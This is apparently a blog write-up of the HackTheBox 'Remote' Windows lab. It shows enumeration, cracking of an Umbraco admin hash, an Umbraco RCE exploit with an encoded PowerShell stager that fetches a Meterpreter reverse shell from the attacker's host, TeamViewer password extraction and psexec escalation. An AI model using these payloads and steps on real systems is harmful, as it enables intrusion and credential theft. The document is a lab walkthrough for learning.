---
title: Remote
date: 2026-03-10
tags: ctf, hackthebox, easy, Windows, Password cracking
excerpt: POC, FTP, Anonymous login, ExploitDB
---

### Recon

### nmap

```python
PORT      STATE SERVICE
21/tcp    open  ftp
80/tcp    open  http
111/tcp   open  rpcbind
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
2049/tcp  open  nfs
5985/tcp  open  wsman
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49678/tcp open  unknown
49679/tcp open  unknown
49680/tcp open  unknown
```

```python
PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
80/tcp    open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
111/tcp   open  rpcbind?
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
2049/tcp  open  rpcbind
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49678/tcp open  unknown
49679/tcp open  unknown
49680/tcp open  unknown
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

### port 21 FTP

```python
ftp 10.10.10.180                                                                                                                                                                                                               
Connected to 10.10.10.180.
220 Microsoft FTP Service
Name (10.10.10.180:xi): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
200 PORT command successful.
150 Opening ASCII mode data connection.
226 Transfer complete.
ftp> dir
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
ftp> pwd
257 "/" is current directory.
```

### port 80 HTTP IIS

```python
http://10.10.10.180 [200 OK] 
Country[RESERVED][ZZ], 
HTML5,
IP[10.10.10.180],
JQuery[3.1.0],Script,
Title[Home - Acme Widgets],
Umbraco, X-UA-Compatible[IE=edge]
```

We can see that the website is running `Umraco CMS` 

 

### Directory Listing

```python
200      129l      302w     5338c http://10.10.10.180/products
200      137l      338w     5011c http://10.10.10.180/blog
200      187l      490w     6703c http://10.10.10.180/home
200      124l      331w     7890c http://10.10.10.180/contact
200      187l      490w     6703c http://10.10.10.180/Home
200      129l      302w     5338c http://10.10.10.180/Products
200      124l      331w     7890c http://10.10.10.180/Contact
302        3l        8w      126c http://10.10.10.180/install
200      137l      338w     5011c http://10.10.10.180/Blog
200      167l      330w     6749c http://10.10.10.180/People
500       80l      276w     3420c http://10.10.10.180/Product
302        3l        8w      126c http://10.10.10.180/INSTALL
500       80l      276w     3420c http://10.10.10.180/master
200      123l      283w     4051c http://10.10.10.180/1112
200      116l      222w     3313c http://10.10.10.180/intranet
200       81l      201w     2750c http://10.10.10.180/1117
200      123l      310w     4236c http://10.10.10.180/1114
200       81l      198w     2741c http://10.10.10.180/person
200      123l      294w     4132c http://10.10.10.180/1115
200      123l      317w     4271c http://10.10.10.180/1113
200       81l      201w     2749c http://10.10.10.180/1119
200      129l      302w     5328c http://10.10.10.180/1107
200      137l      338w     5001c http://10.10.10.180/1125
200      123l      281w     4039c http://10.10.10.180/1109
```



![](/blog/posts/images/remote/image.png)

default creds didn’t work

### Port 2049 NFS

We can enumerate `NFS` to see if there is any mounts

 

```python
showmount -e 10.10.10.180

Export list for 10.10.10.180:
/site_backups (everyone)
```

we can create a `backup` directory and mount the `site_backups` 

```bash
mkdir backup

sudo mount -t nfs 10.10.10.180:/site_backups/
```

```bash
total 119
drwx------ 2 nobody 4294967294  4096 Feb 23  2020 .
drwxr-xr-x 1 xi     xi           188 Jun 10 15:44 ..
drwx------ 2 nobody 4294967294    64 Feb 20  2020 App_Browsers
drwx------ 2 nobody 4294967294  4096 Feb 20  2020 App_Data
drwx------ 2 nobody 4294967294  4096 Feb 20  2020 App_Plugins
drwx------ 2 nobody 4294967294    64 Feb 20  2020 aspnet_client
drwx------ 2 nobody 4294967294 49152 Feb 20  2020 bin
drwx------ 2 nobody 4294967294  8192 Feb 20  2020 Config
drwx------ 2 nobody 4294967294    64 Feb 20  2020 css
-rwx------ 1 nobody 4294967294   152 Nov  1  2018 default.aspx
-rwx------ 1 nobody 4294967294    89 Nov  1  2018 Global.asax
drwx------ 2 nobody 4294967294  4096 Feb 20  2020 Media
drwx------ 2 nobody 4294967294    64 Feb 20  2020 scripts
drwx------ 2 nobody 4294967294  8192 Feb 20  2020 Umbraco
drwx------ 2 nobody 4294967294  4096 Feb 20  2020 Umbraco_Client
drwx------ 2 nobody 4294967294  4096 Feb 20  2020 Views
-rwx------ 1 nobody 4294967294 28539 Feb 20  2020 Web.config
```

Reading about Umbraco credential files online reveals that credentials are stored in the file `Umbraco.sdf`

within the App_Data folder. Let's check for admin user credentials in this file

This reveals the username admin@htb.local and a SHA1 password hash. This can be cracked using John The Ripper.

```bash
adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}
```

```bash
john hash --format=Raw-SHA1 --wordlist=/home/xi/rockyou.txt
                         
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-SHA1 [SHA1 128/128 AVX 4x])
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
baconandcheese (?)
Session completed
```

After logging in we can see the version Umbraco is running `Umbraco version 7.12.4` and has a public Authenticated RCE exploit.

https://www.exploit-db.com/exploits/46153

We can modify the exploit and fill the required fields:

 

```python
login = "admin@htb.local";
password ="baconandcheese";
host = "http://10.10.10.180";
```

In order to validate the vulnerability, we can change the payload to issue a web request to our server using

`wget 10.10.14.7/rce` (changing this to your tun0 IP address). We can use `iwr` , `wget` and `curl` as aliases

for the PowerShell command `Invoke-WebRequest` .

```python
# Execute a calc for the PoC
payload = '<?xml version="1.0"?><xsl:stylesheet version="1.0" \
xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:msxsl="urn:schemas-microsoft-com:xslt" \
xmlns:csharp_user="http://csharp.mycompany.com/mynamespace">\
<msxsl:script language="C#" implements-prefix="csharp_user">public string xml() \
{ string cmd = "wget 10.10.14.11/rce"; System.Diagnostics.Process proc = new System.Diagnostics.Process();\
 proc.StartInfo.FileName = "powershell.exe"; proc.StartInfo.Arguments = cmd;\
 proc.StartInfo.UseShellExecute = false; proc.StartInfo.RedirectStandardOutput = true; \
 proc.Start(); string output = proc.StandardOutput.ReadToEnd(); return output; } \
 </msxsl:script><xsl:template match="/"> <xsl:value-of select="csharp_user:xml()"/>\
 </xsl:template> </xsl:stylesheet> ';
```

```bash
sudo python3 -m http.server 80                                                        
 
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.180 - - [10/Jun/2023 16:36:05] "GET /rce HTTP/1.1" 200 -
```

We receive a hit our our server, which confirms that the CMS is vulnerable. Using Metasploit's

`web_delivery module,` we can create a PowerShell payload that can be used to obtain a reverse shell.

```bash
msfconsole
use exploit/multi/script/web_delivery
set RHOSTS <ip>
set payload windows/x64/meterpreter/reverse_tcp
set LHOST tun0
set target 2
run
```

```bash
powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbAA9AFsATgBlAHQALgBTAGUAYwB1AHIAaQB0AHkAUAByAG8AdABvAGMAbwBsAFQAeQBwAGUAXQA6ADoAVABsAHMAMQAyADsAJABvAHgAPQBuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAA7AGkAZgAoAFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAFAAcgBvAHgAeQBdADoAOgBHAGUAdABEAGUAZgBhAHUAbAB0AFAAcgBvAHgAeQAoACkALgBhAGQAZAByAGUAcwBzACAALQBuAGUAIAAkAG4AdQBsAGwAKQB7ACQAbwB4AC4AcAByAG8AeAB5AD0AWwBOAGUAdAAuAFcAZQBiAFIAZQBxAHUAZQBzAHQAXQA6ADoARwBlAHQAUwB5AHMAdABlAG0AVwBlAGIAUAByAG8AeAB5ACgAKQA7ACQAbwB4AC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzAD0AWwBOAGUAdAAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAQwBhAGMAaABlAF0AOgA6AEQAZQBmAGEAdQBsAHQAQwByAGUAZABlAG4AdABpAGEAbABzADsAfQA7AEkARQBYACAAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA0AC4AMQAxADoAOAAwADgAMAAvAEMAQgBJAEIAeQBOAHUAcwBPAEQAZgBqAC8AbQBWAEcAVwBxAG0ATAB2AGsANgAzADQANQBGACcAKQApADsASQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADQALgAxADEAOgA4ADAAOAAwAC8AQwBCAEkAQgB5AE4AdQBzAE8ARABmAGoAJwApACkAOwA=
```

Let's modify the payload in the script.

```bash
payload = '<?xml version="1.0"?><xsl:stylesheet version="1.0" \
xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:msxsl="urn:schemas-microsoft-com:xslt" \
xmlns:csharp_user="http://csharp.mycompany.com/mynamespace">\
<msxsl:script language="C#" implements-prefix="csharp_user">public string xml() \
{ string cmd = "-nop -w hidden -e WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbAA9AFsATgBlAHQALgBTAGUAYwB1AHIAaQB0AHkAUAByAG8AdABvAGMAbwBsAFQAeQBwAGUAXQA6ADoAVABsAHMAMQAyADsAJABvAHgAPQBuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAA7AGkAZgAoAFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAFAAcgBvAHgAeQBdADoAOgBHAGUAdABEAGUAZgBhAHUAbAB0AFAAcgBvAHgAeQAoACkALgBhAGQAZAByAGUAcwBzACAALQBuAGUAIAAkAG4AdQBsAGwAKQB7ACQAbwB4AC4AcAByAG8AeAB5AD0AWwBOAGUAdAAuAFcAZQBiAFIAZQBxAHUAZQBzAHQAXQA6ADoARwBlAHQAUwB5AHMAdABlAG0AVwBlAGIAUAByAG8AeAB5ACgAKQA7ACQAbwB4AC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzAD0AWwBOAGUAdAAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAQwBhAGMAaABlAF0AOgA6AEQAZQBmAGEAdQBsAHQAQwByAGUAZABlAG4AdABpAGEAbABzADsAfQA7AEkARQBYACAAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA0AC4AMQAxADoAOAAwADgAMAAvAEMAQgBJAEIAeQBOAHUAcwBPAEQAZgBqAC8AbQBWAEcAVwBxAG0ATAB2AGsANgAzADQANQBGACcAKQApADsASQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADQALgAxADEAOgA4ADAAOAAwAC8AQwBCAEkAQgB5AE4AdQBzAE8ARABmAGoAJwApACkAOwA="; System.Diagnostics.Process proc = new System.Diagnostics.Process();\
 proc.StartInfo.FileName = "powershell.exe"; proc.StartInfo.Arguments = cmd;\
 proc.StartInfo.UseShellExecute = false; proc.StartInfo.RedirectStandardOutput = true; \
 proc.Start(); string output = proc.StandardOutput.ReadToEnd(); return output; } \
 </msxsl:script><xsl:template match="/"> <xsl:value-of select="csharp_user:xml()"/>\
 </xsl:template> </xsl:stylesheet> ';
```

Upon running the exploit we get a reverse shell

```ruby
[*] 10.10.10.180     web_delivery - Delivering AMSI Bypass (1374 bytes)
[*] 10.10.10.180     web_delivery - Delivering Payload (3683 bytes)
[*] Sending stage (200774 bytes) to 10.10.10.180
[*] Meterpreter session 1 opened (10.10.14.11:4444 -> 10.10.10.180:49725) at 2023-06-10 17:36:29 +0300
sessions -i 1
[*] Starting interaction with 1...

meterpreter >
```

### Privilege Escalation

Having gained a foothold, we can now enumerate the host. Checking for running services reveals the `TeamViewer` service.

```bash
c:\Users\Public>tasklist /svc
tasklist /svc

Image Name                     PID Services                                    
========================= ======== ============================================
System Idle Process              0 N/A                                         
System                           4 N/A                                         
Registry                        88 N/A                                         
smss.exe                       296 N/A                                         
csrss.exe                      384 N/A                                         
wininit.exe                    492 N/A                                         
csrss.exe                      500 N/A                                         
winlogon.exe                   556 N/A                                         
services.exe                   632 N/A                                         
lsass.exe                      640 KeyIso, SamSs                               
svchost.exe                    748 BrokerInfrastructure, DcomLaunch, LSM,      
                                   PlugPlay, Power, SystemEventsBroker         
fontdrvhost.exe                768 N/A                                         
fontdrvhost.exe                776 N/A                                         
svchost.exe                    860 RpcEptMapper, RpcSs                         
dwm.exe                        952 N/A                                         
svchost.exe                    984 DsmSvc, gpsvc, IKEEXT, iphlpsvc, ProfSvc,   
                                   Schedule, SENS, ShellHWDetection, Themes,   
                                   UserManager, UsoSvc, Winmgmt, WpnService    
svchost.exe                   1016 Dhcp, EventLog, lmhosts, TimeBrokerSvc,     
                                   WinHttpAutoProxySvc                         
svchost.exe                     68 DsSvc, NcbService, PcaSvc, SysMain, TrkWks, 
                                   UALSVC                                      
svchost.exe                    484 CoreMessagingRegistrar, DPS                 
vm3dservice.exe               1104 vm3dservice                                 
svchost.exe                   1116 CDPSvc, EventSystem, FontCache, netprofm,   
                                   nsi, SstpSvc                                
svchost.exe                   1204 CryptSvc, Dnscache, LanmanWorkstation,      
                                   NlaSvc, WinRM                               
svchost.exe                   1440 Wcmsvc                                      
svchost.exe                   1584 BFE, mpssvc                                 
svchost.exe                   1716 PolicyAgent                                 
spoolsv.exe                   1460 Spooler                                     
svchost.exe                    676 AppHostSvc                                  
svchost.exe                   2056 DiagTrack                                   
svchost.exe                   2076 ftpsvc                                      
inetinfo.exe                  2108 IISADMIN                                    
svchost.exe                   2152 LanmanServer                                
VGAuthService.exe             2260 VGAuthService                               
vmtoolsd.exe                  2280 VMTools                                     
TeamViewer_Service.exe        2288 TeamViewer7                                 
svchost.exe                   2300 W32Time                                     
svchost.exe                   2332 W3SVC, WAS                                  
MsMpEng.exe                   2340 WinDefend                                   
nfssvc.exe                    2396 NfsService                                  
svchost.exe                   2644 RasMan                                      
dllhost.exe                   3156 COMSysApp                                   
WmiPrvSE.exe                  3184 N/A                                         
msdtc.exe                     3408 MSDTC                                       
LogonUI.exe                   3576 N/A                                         
SearchIndexer.exe              800 WSearch                                     
svchost.exe                   4604 StateRepository                             
svchost.exe                   5108 WaaSMedicSvc                                
w3wp.exe                      2416 N/A                                         
powershell.exe                4432 N/A                                         
conhost.exe                   2688 N/A                                         
cmd.exe                        756 N/A                                         
conhost.exe                   4228 N/A                                         
tasklist.exe                   272 N/A
```

This confirms that TeamViewer 7 is installed, which is known to be vulnerable to CVE-2019-18988.

TeamViewer versions 7.0.43148 through to 14.7.1965 (with TeamViewer 14 the

`SecurityPasswordExported` key must be available). In vulnerable versions, AES-128-CBC encrypted user

passwords are stored in the Windows registry using the known key `0602000000a400005253413100040000`

and the iv `0100010067244F436E6762F25EA8D704` .

Let’s background the session and use `team_Viewer` password module.

```bash
msf6 post(windows/gather/credentials/teamviewer_passwords) > set SESSION 1
SESSION => 1
msf6 post(windows/gather/credentials/teamviewer_passwords) > run

[*] Finding TeamViewer Passwords on REMOTE
[+] Found Unattended Password: !R3m0te!
```

The module output reveals the password `!R3m0te!` . The TeamViewer password by itself doesn't provide us with elevated access. However, it is possible that the password could have been reused with a privileged account such as the local administrator.

As the SMB service is running, we can attempt to obtain SYSTEM access using Metasploit's `psexec` module.

```bash
msf6 post(windows/gather/credentials/teamviewer_passwords) > use exploit/windows/smb/psexec
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/smb/psexec) > set RHOSTS 10.10.10.180
RHOSTS => 10.10.10.180
msf6 exploit(windows/smb/psexec) > set SMBPASS !R3m0te!
SMBPASS => !R3m0te!
msf6 exploit(windows/smb/psexec) > set SMBUSER administrator
SMBUSER => administrator
msf6 exploit(windows/smb/psexec) > set LHOST tun0
LHOST => tun0
msf6 exploit(windows/smb/psexec) > run

===============================================================================
[*] Started reverse TCP handler on 10.10.14.11:4343 
[*] 10.10.10.180:445 - Connecting to the server...
[*] 10.10.10.180:445 - Authenticating to 10.10.10.180:445 as user 'administrator'...
[*] 10.10.10.180:445 - Selecting PowerShell target
[*] 10.10.10.180:445 - Executing the payload...
[+] 10.10.10.180:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (175686 bytes) to 10.10.10.180
[*] Meterpreter session 2 opened (10.10.14.11:4343 -> 10.10.10.180:49732) at 2023-06-10 18:06:14 +0300

meterpreter >

```
